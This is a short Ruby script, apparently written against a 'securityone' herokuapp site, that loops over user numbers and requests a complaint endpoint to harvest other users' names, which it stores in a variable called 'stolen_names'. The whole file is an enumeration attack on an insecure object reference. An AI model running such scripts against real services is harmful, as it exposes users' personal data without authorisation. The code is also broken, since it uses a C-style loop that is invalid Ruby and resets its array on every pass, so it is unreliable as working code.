require 'httparty'
for(i=0, i<42, i++)
	stolen_names_array = []
	stolen_names = HTTParty.get("http://securityone.herokuapp.com/complaint?utf8=%E2%9C%93&complaint=Hello%0D%0A&user_num=#{i}&commit=Submit+Complaint").parsed_response.split(" ")[1]
	stolen_names_array.push(stolen_names)
end